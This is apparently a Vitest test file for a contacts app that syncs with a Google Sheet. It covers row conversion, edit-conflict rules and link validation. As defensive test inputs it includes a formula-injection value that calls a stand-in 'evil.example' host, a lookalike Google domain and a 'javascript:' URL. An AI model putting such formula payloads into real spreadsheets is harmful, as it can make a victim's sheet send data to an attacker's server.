import { describe, expect, it } from "vitest";
import { SHEET_FIELDS, SHEET_HEADER, isSheetUrl, planSheet, readRow, rowOf, valuesOf, type SheetRow, type SheetValues } from "./sheet";

/**
 * Your contacts as a Google Sheet: a contact as a row and back, and the one
 * rule for which side is right when the sheet and Caulder disagree.
 */

const blank = Object.fromEntries(SHEET_FIELDS.map((field) => [field, null])) as SheetValues;
const contact = (over: Partial<SheetValues>): SheetValues => ({ ...blank, name: "Harbour Coffee", ...over });
const shown = { stage: "Contacted", value: "4,800", next: "Call tomorrow", lastContacted: "2026-10-08" };

/** A row as the sheet hands it back, from a contact as Caulder wrote it. */
const asRead = (id: string | null, values: SheetValues): SheetRow | null => readRow(rowOf(id ?? "", values, shown));

describe("a contact as a row", () => {
  it("is its id, what can be changed, then what Caulder says - under a heading each", () => {
    const row = rowOf("c1", contact({ email: "maya@harbour.example", city: "San Francisco" }), shown);
    expect(row).toHaveLength(SHEET_HEADER.length);
    expect(row[0]).toBe("c1");
    expect(row[1]).toBe("Harbour Coffee");
    expect(row.slice(-4)).toEqual(["Contacted", "4,800", "Call tomorrow", "2026-10-08"]);
    expect(SHEET_HEADER[0]).toBe("Caulder ID");
    expect(SHEET_HEADER.slice(-4).every((heading) => heading.endsWith("(from Caulder)"))).toBe(true);
  });

  it("writes nothing a spreadsheet would run, and reads it back as it was typed", () => {
    const values = contact({ phone: "+91 98765 43210", notes: "=IMPORTXML(\"http://evil.example\")", source: "@handle" });
    const row = rowOf("c1", values, shown);
    expect(row[4]).toBe("'+91 98765 43210");
    expect(row[10]).toBe("'=IMPORTXML(\"http://evil.example\")");
    // Sheets shows the cell without the apostrophe; either way it reads back the same.
    expect(asRead("c1", values)?.values).toEqual(valuesOf(values));
    expect(readRow(["c1", "Harbour Coffee", "", "", "+91 98765 43210"])?.values.phone).toBe("+91 98765 43210");
  });

  it("is one line a cell, and an empty cell is nothing", () => {
    expect(rowOf("c1", contact({ notes: "first\nsecond" }), shown)[10]).toBe("first second");
    expect(readRow(["c1", "  Harbour Coffee  ", "", "   "])).toMatchObject({ id: "c1", values: { name: "Harbour Coffee", contactPerson: null, email: null } });
  });

  it("is nothing at all when the row is empty", () => {
    expect(readRow(["", "", "", ""])).toBeNull();
    expect(readRow([])).toBeNull();
  });
});

describe("which side is right", () => {
  const local = new Map([["c1", contact({ phone: "111", city: "Oslo" })]]);
  const base = new Map([["c1", contact({ phone: "111", city: "Oslo" })]]);

  it("changes nothing when the sheet is as Caulder left it", () => {
    expect(planSheet(local, base, [asRead("c1", contact({ phone: "111", city: "Oslo" }))])).toEqual({ updates: [], creates: [], problems: [] });
  });

  it("takes a cell that was edited in the sheet", () => {
    const plan = planSheet(local, base, [asRead("c1", contact({ phone: "222", city: "Oslo" }))]);
    expect(plan.updates).toEqual([{ id: "c1", changes: { phone: "222" } }]);
  });

  it("keeps an edit made in Caulder since, when the sheet did not touch that cell", () => {
    // Caulder now says Bergen; the sheet still shows what was last written, Oslo.
    const edited = new Map([["c1", contact({ phone: "111", city: "Bergen" })]]);
    expect(planSheet(edited, base, [asRead("c1", contact({ phone: "111", city: "Oslo" }))]).updates).toEqual([]);
  });

  it("keeps both, when each side changed a different cell", () => {
    const edited = new Map([["c1", contact({ phone: "111", city: "Bergen" })]]);
    const plan = planSheet(edited, base, [asRead("c1", contact({ phone: "222", city: "Oslo" }))]);
    expect(plan.updates).toEqual([{ id: "c1", changes: { phone: "222" } }]);
  });

  it("takes the sheet's word when both changed the same cell", () => {
    const edited = new Map([["c1", contact({ phone: "333", city: "Oslo" })]]);
    expect(planSheet(edited, base, [asRead("c1", contact({ phone: "222", city: "Oslo" }))]).updates).toEqual([{ id: "c1", changes: { phone: "222" } }]);
  });

  it("clears a cell emptied in the sheet, but never a name", () => {
    const plan = planSheet(local, base, [asRead("c1", { ...contact({ city: "Oslo" }), phone: null, name: null })]);
    expect(plan.updates).toEqual([{ id: "c1", changes: { phone: null } }]);
  });

  it("changes nothing for a contact never written to the sheet before", () => {
    expect(planSheet(local, new Map(), [asRead("c1", contact({ phone: "111", city: "Oslo" }))]).updates).toEqual([]);
  });
});

describe("rows the sheet added or lost", () => {
  const local = new Map([
    ["c1", contact({})],
    ["c2", contact({ name: "Nordlys Design" })],
  ]);

  it("makes a contact from a row typed in with a name, and says so of one without", () => {
    const plan = planSheet(local, local, [
      asRead("c1", contact({})),
      asRead("c2", contact({ name: "Nordlys Design" })),
      asRead(null, contact({ name: "Studio Palma", email: "lucia@palma.example" })),
      asRead(null, { ...blank, email: "nobody@example.com" }),
    ]);
    expect(plan.creates).toEqual([{ row: 4, values: contact({ name: "Studio Palma", email: "lucia@palma.example" }) }]);
    expect(plan.problems).toEqual(["Row 5 has no name, so it was not made a contact."]);
  });

  it("does not make a second contact of one whose id was lost from the sheet", () => {
    // Nordlys is in Caulder and not in the sheet by id; the row with its name is that contact.
    const plan = planSheet(local, local, [asRead("c1", contact({})), asRead(null, contact({ name: "nordlys design", city: "Oslo" }))]);
    expect(plan.creates).toEqual([]);
    expect(plan.updates).toEqual([{ id: "c2", changes: { name: "nordlys design", city: "Oslo" } }]);
  });

  it("makes nothing of a row whose contact was deleted in Caulder, and leaves a repeat out", () => {
    const plan = planSheet(local, local, [asRead("gone", contact({ name: "Old lead" })), asRead("c1", contact({})), asRead("c1", contact({ city: "Paris" }))]);
    expect(plan.creates).toEqual([]);
    expect(plan.updates).toEqual([]);
    expect(plan.problems).toEqual(["Row 4 repeats a contact that is already in the sheet, so it was left out."]);
  });

  it("asks nothing for a row deleted from the sheet: it comes back when the list is written", () => {
    expect(planSheet(local, local, [asRead("c1", contact({}))])).toEqual({ updates: [], creates: [], problems: [] });
  });
});

describe("the link to the sheet", () => {
  it("is a Google spreadsheet's address, and nothing else", () => {
    expect(isSheetUrl("https://docs.google.com/spreadsheets/d/1AbC_d-9/edit")).toBe(true);
    expect(isSheetUrl("https://docs.google.com/spreadsheets/d/1AbC_d-9")).toBe(true);
    expect(isSheetUrl("https://docs.google.com.evil.example/spreadsheets/d/1AbC/edit")).toBe(false);
    expect(isSheetUrl("http://docs.google.com/spreadsheets/d/1AbC/edit")).toBe(false);
    expect(isSheetUrl("javascript:alert(1)")).toBe(false);
    expect(isSheetUrl(null)).toBe(false);
  });
});
